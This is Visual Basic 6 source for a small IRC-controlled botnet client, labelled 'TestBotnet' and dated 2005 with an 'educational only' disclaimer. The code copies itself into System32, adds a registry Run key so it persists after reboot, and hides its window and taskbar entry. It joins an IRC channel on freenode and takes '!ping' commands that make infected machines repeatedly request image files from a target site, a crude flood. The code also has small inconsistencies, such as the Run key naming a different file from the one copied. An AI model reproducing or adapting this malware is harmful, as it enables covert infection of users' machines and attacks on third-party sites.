VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form y 
   Caption         =   "TestBotnet"
   ClientHeight    =   570
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4290
   LinkTopic       =   "Form1"
   ScaleHeight     =   570
   ScaleWidth      =   4290
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer t 
      Interval        =   30000
      Left            =   600
      Top             =   360
   End
   Begin VB.TextBox Text3 
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Text            =   "USER dfddsafdsasr ""rawr.com"" ""irc.freenode.net"" :Mike"
      Top             =   2640
      Width           =   4455
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   1200
      Top             =   2280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "y"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' botNet example
' (c) Daniel Seripap - 2005
' Credits: m1k3
' DISCLAIMER:
'            The author of this source is NOT responsible for
'            what you are doing with it - weather it is to
'            harm or not to. This source was intended for
'            educational uses ONLY. Please don't be stupid
'            and do anything illegal with it. Again, DANIEL
'            SERIPAP IS NOT RESPONSIBLE!
'            Also - if you do not agree with it, delete the
'            source from your computer NOW.
'            ok thanks, and enjoy.

Dim site As String
Dim packets As Integer

Private Sub Form_Load()

If App.Path <> "C:\WINDOWS\System32" Then
MsgBox "By clicking okay  or passing this dialog, you release anybody but yourself from any liability for damages arising from the use of the software.  " & vbCrLf & vbCrLf & "If you do not agree to this, end the process immediately", vbCritical
FileSystem.FileCopy App.Path & "\" & App.EXEName & ".exe", "C:\WINDOWS\System32\supdate.exe"
Call CreateKey("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\supdate", "C:\WINDOWS\System32\ysupdate.exe")
End If


If App.PrevInstance = True Then End
App.TaskVisible = False
y.Visible = False

' irc server, port
Winsock1.Connect "irc.freenode.net", 6667

End Sub

Private Sub t_Timer()
' sends a message to the room '#WINSOCK'
Winsock1.SendData "PRIVMSG #WINSOCK :7 [pHx]5 vBotNet (v1)7 [haxt.net]" & vbCrLf

End Sub

Private Sub Winsock1_Close()
' reconnects automatically if lost of connection
Winsock1.Connect "irc.freenode.net", 6667

End Sub

Private Sub Winsock1_Connect()
' sets nickname
Winsock1.SendData "NICK " & Winsock1.LocalHostName & vbCrLf
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
' more crap
' this part was by m1k3 :)
Dim dat As String
Winsock1.GetData dat

If InStr(1, dat, "No identd") Then
Winsock1.SendData Text3.Text & vbCrLf
End If
If InStr(1, dat, "PRIVMSG") Then Winsock1.SendData "JOIN #WINSOCK" & vbCrLf ' joins #winsock

If InStr(1, dat, "!ping ") Then
A1 = Split(dat, "!ping ")


A2 = Split(A1(1), ";")
A3 = Split(A2(0), " ")
site = A3(0)
packets = A3(1)
If packets < 30 Then

 Winsock1.SendData "PRIVMSG #WINSOCK :PINGING" & vbCrLf
 For i = 1 To packets
If InStr(1, LCase(site), ".gif") Then
 RequestFile (site)
 End If
 
 If InStr(1, LCase(site), ".jpg") Then
 RequestFile (site)
 End If
 
 
 Next i
  Winsock1.SendData "PRIVMSG #WINSOCK :Pinging Stopped" & vbCrLf
  
  
End If
If packets > 500 Then
Winsock1.SendData "PRIVMSG #WINSOCK :Too many pings at once, valid from 1-499" & vbCrLf
End If
End If


 'Winsock1.SendData "PRIVMSG #WINSOCK :Ping Finished."
 If InStr(1, dat, "!stop") Then Exit Sub
End Sub

